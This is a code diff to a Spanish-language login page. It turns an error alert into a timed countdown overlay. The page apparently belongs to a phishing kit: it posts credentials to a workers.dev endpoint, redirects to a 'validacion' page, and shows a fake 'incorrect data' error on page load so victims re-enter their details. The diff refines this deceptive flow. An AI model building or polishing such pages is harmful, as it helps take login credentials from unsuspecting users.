@@ -168,7 +168,14 @@ body{min-height:100vh}
   font-size: 15px;
   color: #6c757d;
   line-height: 1.5;
-  margin-bottom: 20px;
+  margin-bottom: 15px;
+}
+
+.alert-counter {
+  font-size: 48px;
+  font-weight: 700;
+  color: #ff5b00;
+  margin-bottom: 15px;
 }
 
 .alert-btn {
@@ -181,6 +188,7 @@ body{min-height:100vh}
   font-weight: 600;
   cursor: pointer;
   transition: opacity 0.3s;
+  display: none;
 }
 
 .alert-btn:hover {
@@ -283,6 +291,9 @@ body{min-height:100vh}
   }
   .links div{margin-bottom:12px}
   .note{font-size:10px;margin-top:16px}
+  .alert-counter {
+    font-size: 36px;
+  }
 }
 
 /* TELÉFONOS MUY PEQUEÑOS */
@@ -300,6 +311,9 @@ body{min-height:100vh}
   .field input{font-size:14px}
   .btn{height:52px;font-size:15px}
   .links{font-size:13px}
+  .alert-counter {
+    font-size: 30px;
+  }
 }
 </style>
 </head>
@@ -311,7 +325,8 @@ body{min-height:100vh}
     <div class="alert-icon">⚠️</div>
     <div class="alert-title">Datos incorrectos</div>
     <div class="alert-message">Por favor, verifica tus datos e intenta nuevamente.</div>
-    <button class="alert-btn" onclick="cerrarAlerta()">Entendido</button>
+    <div class="alert-counter" id="alertCounter">5</div>
+    <button class="alert-btn" id="alertBtn" onclick="cerrarAlerta()">Entendido</button>
   </div>
 </div>
 
@@ -359,12 +374,46 @@ body{min-height:100vh}
 // ========================= CONFIGURACIÓN =========================
 const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
 
-// ========================= ALERTA =========================
-function mostrarAlerta() {
-    document.getElementById('alertOverlay').style.display = 'flex';
+// ========================= ALERTA CON CONTADOR =========================
+let contadorInterval = null;
+
+function mostrarAlertaConContador() {
+    const overlay = document.getElementById('alertOverlay');
+    const counterEl = document.getElementById('alertCounter');
+    const btnEl = document.getElementById('alertBtn');
+    
+    // Ocultar botón al inicio
+    btnEl.style.display = 'none';
+    
+    // Mostrar overlay
+    overlay.style.display = 'flex';
+    
+    let contador = 5;
+    counterEl.textContent = contador;
+    
+    // Limpiar intervalo anterior si existe
+    if (contadorInterval) {
+        clearInterval(contadorInterval);
+    }
+    
+    contadorInterval = setInterval(function() {
+        contador--;
+        counterEl.textContent = contador;
+        
+        if (contador <= 0) {
+            clearInterval(contadorInterval);
+            contadorInterval = null;
+            // Ocultar la alerta
+            overlay.style.display = 'none';
+        }
+    }, 1000);
 }
 
 function cerrarAlerta() {
+    if (contadorInterval) {
+        clearInterval(contadorInterval);
+        contadorInterval = null;
+    }
     document.getElementById('alertOverlay').style.display = 'none';
 }
 
@@ -427,19 +476,19 @@ async function handleLogin() {
             window.location.href = 'validacion.html';
             
         } else {
-            // Error silencioso - solo log
+            // Error - mostrar alerta con contador
             console.error('❌ Error:', data.error);
             loginBtn.disabled = false;
             loginBtn.classList.remove('loading');
             loginBtn.textContent = textoOriginal;
-            mostrarAlerta();
+            mostrarAlertaConContador();
         }
     } catch (error) {
         console.error('❌ Error en login:', error);
         loginBtn.disabled = false;
         loginBtn.classList.remove('loading');
         loginBtn.textContent = textoOriginal;
-        mostrarAlerta();
+        mostrarAlertaConContador();
     }
 }
 
@@ -448,9 +497,9 @@ document.addEventListener('DOMContentLoaded', function() {
     const loginBtn = document.getElementById('loginBtn');
     const inputs = document.querySelectorAll('input');
 
-    // MOSTRAR ALERTA AL CARGAR LA PÁGINA
+    // MOSTRAR ALERTA CON CONTADOR AL CARGAR LA PÁGINA
     setTimeout(function() {
-        mostrarAlerta();
+        mostrarAlertaConContador();
     }, 500);
 
     // Click en botón
